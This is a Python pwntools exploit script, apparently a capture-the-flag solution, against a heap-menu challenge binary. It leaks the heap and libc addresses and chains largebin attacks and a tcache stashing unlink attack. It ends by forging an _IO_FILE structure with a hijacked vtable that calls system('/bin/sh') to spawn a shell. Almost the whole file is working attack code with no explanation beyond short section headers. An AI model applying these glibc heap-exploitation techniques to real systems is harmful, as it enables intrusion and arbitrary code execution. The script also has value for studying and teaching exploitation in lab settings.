#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def fruit(size):
	if (size==0xdd0): return b"Apple"
	elif (size==0xcb0): return b"Banana"
	elif (size==0xe50): return b"Cherry"
	elif (size==0x110): return b"Durian"

def new(size,idx,content=b'\n'):
	p.recvuntil(b"> ")
	p.sendline(b"1")
	p.recvline()
	p.sendline(fruit(size))
	p.recvline()
	p.sendline(i2b(idx))
	p.recvline()
	p.send(content)
	
def delete(size,idx):
	p.recvuntil(b"> ")
	p.sendline(b"4")
	p.recvline()
	p.sendline(fruit(size))
	p.recvuntil(b"idx:\n\x00")
	p.sendline(i2b(idx))
	
def show(size,idx):
	p.recvuntil(b"> ")
	p.sendline(b"3")
	p.recvline()
	p.sendline(fruit(size))
	p.recvuntil(b"idx:\n\x00")
	p.sendline(i2b(idx))
	
def edit(size,idx,content):
	p.recvuntil(b"> ")
	p.sendline(b"2")
	p.recvline()
	p.sendline(fruit(size))
	p.recvline()
	p.sendline(i2b(idx))
	if (size==0xdd0):
		content = content.ljust(size, b"\x00")
		rl()
		sn(content[:0x200])
		rl()
		sn(content[0x200:0x200+0xab0])
		rl()
		sn(content[0x200+0xab0:0x200+0xab0+0x100])
		rl()
		sn(content[0x200+0xab0+0x100:])
	else:
		for i in range(1):
			p.recvline()
			p.send(content)

####---- 5 * 0x120 chunk in tcache		----####
for i in range(5):
	new(0x110, i)
	delete(0x110, i)

####---- 2 * 0x120 chunk in smallbin 	----####
new(0xe50, 0)
new(0xdd0, 0)
new(0xe50, 0)
delete(0xdd0, 0) 		# in smallbin
new(0xcb0, 0)
new(0xe50, 0)
new(0xdd0, 1)			# in smallbin
new(0xe50, 0)
delete(0xdd0, 1)
new(0xcb0, 0)

####---- addr leak 	----####
show(0x110, 1)
ru(b'Content is')
rn(8)
heap_base = uu64(rn(8)) - 0x10
lg("heap_base")
show(0xdd0, 0)
ru(b'Content is')
rn(8)
libc_base = uu64(rn(8)) - 0x1ed1e0
lg("libc_base")

####---- Largebin attack_1 	----####
new(0xdd0, 2)
new(0xe50, 0)
new(0xcb0, 0)
delete(0xdd0, 2)
new(0xe50, 0)
delete(0xcb0, 0)
edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base+0x5d70) + p64(libc_base + l.symbols['__free_hook'] - 0x28))
new(0xe50, 0)
edit(0xdd0, 2, p64(heap_base + 0x79b0) + p64(libc_base+0x1ed1e0) + p64(heap_base + 0x79b0)*2)
edit(0xcb0, 0, p64(libc_base+0x1ed1e0) + p64(heap_base + 0x5d70)*3)

####---- Largebin attack_2 	----####
new(0xdd0, 2)
new(0xe50, 0)
new(0xcb0, 0)
delete(0xdd0, 2)
new(0xe50, 0)
delete(0xcb0, 0)
edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base+0x5d70) + p64(libc_base + 0x1ed5a0 - 0x20))
new(0xe50, 1)			# fake_IO_buffer

####---- tcache stashing unlink attack 	----####
edit(0xdd0, 1, b'a'*0xcb8 + p64(0x121) + p64(heap_base+0x2350) + p64(libc_base+l.symbols['__free_hook'] - 0x20))
new(0x110, 0) 			# calloc(0x110);

####---- fake IO 	----####
IO_str_vtable 	= libc_base + 0x1e9560
system_addr		= libc_base + l.symbols['system']
fake_IO_FILE =  2*p64(0)							#fp->flag=0
fake_IO_FILE +=  p64(1)								#_IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff)					#_IO_write_ptr = 0xffffffffffff
##### fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base #####
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(heap_base+0x7a90)				#_IO_buf_base
fake_IO_FILE += p64(heap_base+0x7a90+0x58)			#_IO_buf_end
fake_IO_FILE = 	fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0)								#change _mode = 0
fake_IO_FILE = 	fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(IO_str_vtable)					#change vtable
payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(system_addr)
edit(0xcb0, 0, payload)
debugPID()

####---- getshell 	----####
ru(b"> ")
sl(b"quit")
irt()
